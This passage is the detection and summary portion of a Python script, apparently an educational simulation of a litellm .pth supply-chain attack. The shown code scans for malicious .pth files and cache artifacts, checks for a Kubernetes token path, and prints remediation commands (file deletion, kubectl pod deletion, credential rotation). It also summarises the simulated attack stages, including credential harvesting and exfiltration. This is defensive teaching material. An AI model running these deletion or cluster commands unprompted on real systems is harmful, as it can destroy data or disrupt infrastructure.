            persistence_found = True

    if persistence_found:
        danger("Persistence mechanism DETECTED -- take immediate action!")
    else:
        success("No sysmon persistence found")

    section("Checking uv / pip caches for compromised wheels")
    cache_paths = [
        Path.home() / ".cache" / "uv",
        Path.home() / ".cache" / "pip",
        Path.home() / "Library" / "Caches" / "pip",
    ]
    for cp in cache_paths:
        if cp.exists():
            pth_in_cache = list(cp.rglob("litellm_init.pth"))
            if pth_in_cache:
                for hit in pth_in_cache:
                    emit(f"    [{red('FOUND')}] {hit}")
            else:
                emit(f"    [{green('clean')}] {cp}  (no litellm_init.pth)")
        else:
            emit(f"    [{dim('skip')}]  {cp}  (directory does not exist)")

    section("Scanning for suspicious .pth files in site-packages")
    known_safe = {
        "distutils-precedence.pth",
        "easy-install.pth",
        "setuptools.pth",
        "coverage.pth",
        "pip.pth",
        "_virtualenv.pth",
        "distutils.pth",
    }
    suspicious_count = 0
    for d in site_dirs:
        if not os.path.isdir(d):
            continue
        for f in sorted(os.listdir(d)):
            if not f.endswith(".pth"):
                continue
            full = os.path.join(d, f)
            is_suspicious = False
            if f.lower() not in known_safe:
                try:
                    with open(full) as fh:
                        for line in fh:
                            stripped = line.strip()
                            if stripped.startswith("import ") and "subprocess" in stripped:
                                is_suspicious = True
                                break
                except (OSError, UnicodeDecodeError):
                    pass

            if is_suspicious:
                emit(f"    {red('! SUSPICIOUS')} {full}")
                suspicious_count += 1
            else:
                emit(f"    {dim('  safe       ')} {dim(full)}")

    if suspicious_count:
        danger(f"Found {suspicious_count} suspicious .pth file(s) -- inspect manually!")
    else:
        success("No suspicious .pth files detected")

    section("Checking Kubernetes environment")
    k8s_token = Path("/var/run/secrets/kubernetes.io/serviceaccount/token")
    if k8s_token.exists():
        warn("Running inside a Kubernetes pod")
        emit(f"    Check for attacker pods:")
        emit(f"    {cyan('kubectl get pods -n kube-system -l app=node-setup')}")
    else:
        success("Not running in Kubernetes")

    # -- Remediation --
    section("Remediation checklist")
    remediation = [
        (
            "Remove compromised package",
            "pip uninstall litellm && pip cache purge\n"
            "rm -rf ~/.cache/uv",
        ),
        (
            "Delete persistence files",
            "rm -f ~/.config/sysmon/sysmon.py\n"
            "rm -f ~/.config/systemd/user/sysmon.service\n"
            "systemctl --user disable sysmon.service 2>/dev/null",
        ),
        (
            "Rotate ALL credentials on the machine",
            "SSH keys, AWS/GCP/Azure tokens, Kubernetes configs,\n"
            "API keys in .env, database passwords, Docker registry auth,\n"
            "NPM tokens, Stripe keys, any secret in shell history",
        ),
        (
            "Audit Kubernetes cluster",
            "kubectl delete pods -n kube-system -l app=node-setup\n"
            "kubectl get secrets -A  (audit for unauthorized access logs)",
        ),
        (
            "Scan CI/CD pipelines",
            "Check all venvs, Docker images, and CI caches for\n"
            "litellm 1.82.7 or 1.82.8",
        ),
        (
            "Pin and verify packages going forward",
            "pip install --require-hashes -r requirements.txt\n"
            "Compare PyPI releases against GitHub tags before upgrading\n"
            "Inspect .whl files: unzip -l <pkg>.whl | grep '.pth'",
        ),
    ]

    for i, (title, detail) in enumerate(remediation, 1):
        emit(f"    {bold(f'{i}.')} {bold(yellow(title))}")
        for line in detail.splitlines():
            emit(f"       {dim(line)}")
        emit()

    pause("Press Enter to see the summary")


# ===================================================================
# Summary
# ===================================================================
def print_summary() -> None:
    emit()
    w = 70
    emit(bold(cyan("=" * w)))
    emit(bold(cyan("  SUMMARY")))
    emit(bold(cyan("=" * w)))
    emit()
    info(
        "This demo walked through the complete attack chain of the litellm\n"
        "    1.82.8 supply chain compromise (March 24, 2026):\n"
    )

    stages = [
        ("Act 0", "The .pth trigger", "One file in site-packages hijacks every Python process"),
        ("Act 1", "Credential harvesting", "SSH keys, cloud creds, K8s configs, env vars, history"),
        ("Act 2", "Encrypted exfiltration", "AES-256-CBC + RSA -> POST to attacker C2 domain"),
        ("Act 3", "Lateral movement", "K8s secret theft, privileged pods, persistent backdoor"),
        ("Act 4", "Detection", "Real checks against your system for IOCs"),
    ]
    for act, title, desc in stages:
        emit(f"    {bold(cyan(act.ljust(6)))} {bold(title.ljust(26))} {dim(desc)}")

    emit()
    emit(bold(yellow("    Key takeaways:")))
    emit()
    info("    * A .pth file is a legitimate Python feature weaponised for")
    info("      pre-execution code injection with full persistence.\n")
    info("    * Supply chain attacks target the PACKAGING LAYER, not your code.")
    info("      You never need to 'import litellm' -- just installing it is enough.\n")
    info("    * Always verify packages: compare PyPI against GitHub tags,")
    info("      inspect .whl archives before installing, use hash pinning.\n")
    info("    * The fork bomb was the attacker's mistake.  A properly written")
    info("      payload would have been completely silent.\n")
    emit(dim("    Reference: https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/"))
    emit(
        dim(
            "    All operations in this demo were simulated."
            "  No credentials were read or transmitted."
        )
    )
    emit()


# ===================================================================
# Helpers
# ===================================================================
def _get_site_dirs() -> list[str]:
    dirs: list[str] = []
    try:
        dirs.extend(site.getsitepackages())
    except AttributeError:
        pass
    try:
        user_site = site.getusersitepackages()
        if isinstance(user_site, str):
            dirs.append(user_site)
        elif isinstance(user_site, list):
            dirs.extend(user_site)
    except AttributeError:
        pass
    return dirs


# ===================================================================
# Main
# ===================================================================
def main() -> None:
    global AUTO, NO_COLOR, LINE_DELAY  # noqa: PLW0603

    parser = argparse.ArgumentParser(
        description="Educational simulation of the litellm .pth supply chain attack",
    )
    parser.add_argument("--auto", action="store_true", help="Run without interactive pauses")
    parser.add_argument("--no-color", action="store_true", help="Disable ANSI color output")
    parser.add_argument("--fast", action="store_true", help="Skip all delays (implies --auto)")
    args = parser.parse_args()

    AUTO = args.auto or args.fast
    NO_COLOR = args.no_color
    if args.fast:
        LINE_DELAY = 0
    if not sys.stdout.isatty():
        NO_COLOR = True

    banner()

    if not AUTO:
        emit(dim("    This interactive demo walks through each stage of the attack."))
        emit(dim("    Press Enter at each prompt to advance.  Use --auto to skip pauses.\n"))
        try:
            input(dim("  [Press Enter to begin...] "))
        except (EOFError, KeyboardInterrupt):
            return

    with tempfile.TemporaryDirectory(prefix="pth_demo_") as sandbox:
        emit(f"\n    {dim('Created sandbox:')} {sandbox}\n")
        create_sandbox(sandbox)

        act0_pth_trigger()
        collected = act1_collection(sandbox)
        act2_exfiltration(collected, sandbox)
        act3_lateral_movement()
        act4_detection()
        print_summary()

        emit(f"    {dim('Cleaning up sandbox:')} {sandbox}")

    emit(f"    {green('Sandbox deleted. No trace remains.')}")
    emit()


if __name__ == "__main__":
    main()
